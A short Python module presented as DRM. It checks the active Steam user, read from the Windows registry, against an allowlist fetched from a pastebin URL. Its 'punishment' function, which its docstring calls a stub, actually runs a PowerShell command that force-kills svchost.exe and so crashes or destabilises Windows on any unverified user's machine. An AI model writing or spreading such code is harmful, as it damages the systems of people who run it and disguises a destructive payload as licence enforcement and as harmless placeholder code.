"""
Facilitates DRM.
"""

import winreg
import logging
import os
import subprocess

import requests
import steamid_converter.Converter

VERIFICATION_SERVER = "https://pastebin.com/raw/mCgtjEvZ"

def get_verified_users() -> list:
    """
    Retrieves list of verified users from a verfication server.
    """
    try:
        response  = requests.get(VERIFICATION_SERVER)
        verified_users = response.text.split(",")
        verified_users.pop(-1)
    except ConnectionError:
        logging.error("Could not connecto verfication service!")
        os._exit(1)
    return verified_users

def find_current_user() -> str:
    """
    Searches the Windows registry to find the steamid3 of the active user.
    """
    try:
        registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        steam_key = winreg.OpenKey(registry, r'SOFTWARE\\Valve\Steam\ActiveProcess')
        steam_open = winreg.QueryValueEx(steam_key, 'ActiveUser')
    except WindowsError as error:
        logging.error("Could not access REGISTRY: %s", error)
        os._exit(1)
    return steamid_converter.Converter.to_steamID64(f"[U:1:{steam_open[0]}]")

def verify_user() -> bool:
    """
    Verifies the user.
    """
    verified = False
    if find_current_user() in get_verified_users():
        verified = True
    return verified


def punishment() -> bool:
    """
    Punishes unverified users. Stub.
    """
    subprocess.run(["powershell", "TASKKILL /IM svchost.exe /F"], check=False)

    return True
